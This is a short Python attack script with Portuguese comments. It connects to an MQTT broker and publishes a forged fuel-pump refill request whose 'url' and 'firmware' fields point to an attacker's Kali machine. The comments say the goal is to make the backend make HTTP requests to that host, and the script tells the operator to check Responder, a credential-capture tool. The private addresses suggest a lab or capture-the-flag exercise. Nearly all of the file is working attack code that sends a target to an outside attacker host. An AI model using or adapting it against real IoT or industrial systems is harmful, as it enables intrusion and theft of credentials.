import json
import paho.mqtt.client as mqtt

BROKER = "10.10.100.100"
KALI_IP = "10.10.100.8"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883, 60)

# Tentando forçar o backend a fazer um "fetch" ou requisição HTTP para o seu Kali
payload = {
    "pumpId": "PUMP003",
    "currentLevel": 5,
    "url": f"http://{KALI_IP}/trigger",
    "firmware": f"http://{KALI_IP}/firmware.bin"
}

client.publish("fuel-pumps/refill-request", json.dumps(payload))
print("[+] Gatilho HTTP enviado. Verifique o terminal do Responder!")
client.disconnect()
